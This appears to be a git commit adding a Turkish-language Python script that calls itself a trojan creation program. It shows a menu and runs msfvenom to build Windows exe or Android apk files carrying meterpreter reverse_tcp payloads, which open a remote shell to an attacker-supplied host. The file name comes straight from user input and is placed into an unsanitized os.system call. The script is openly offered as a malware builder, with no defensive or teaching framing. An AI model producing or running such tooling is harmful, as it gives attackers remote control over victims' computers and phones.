3ac22c7c435a104b0171439cb8583868bfc76728
ertyujasderblacklord <96084687+ertyujasderblacklord@users.noreply.github.com>
2024-06-28 20:46:15 +0300

    Add files via upload

---
+++ trojanOluşturmaProgramı.py
@@ -0,0 +1,29 @@
+import os
+
+
+os.system("figlet TROJLORD")
+print("""Trojan Oluşturma Programına Hoş Geldiniz
+      1-Windows Sistemler İçin Trojan Oluştur
+      2-Android Sistemler için Trojan Oluştur
+      
+      """)
+
+seçim = input("Lütfen Yapmak İstediğiniz İşlemi Seçiniz:")
+
+def windowsTrojanOluşturma():
+    print("""Windows Trojan Oluşturma Programına Hoş Geldiniz""")
+    trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
+    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe > {trojan}.exe")
+
+def androidTrojanOluşturma():
+    print("""Android Trojan Oluşturma Programına Hoş Geldiniz""")
+    trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
+    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port  -f apk > {trojan}.apk")
+
+
+if seçim == "1":
+    windowsTrojanOluşturma()
+elif seçim == "2":
+    androidTrojanOluşturma()
+else:
+    print("Yanlış Seçim Program Kapatılıyor...")
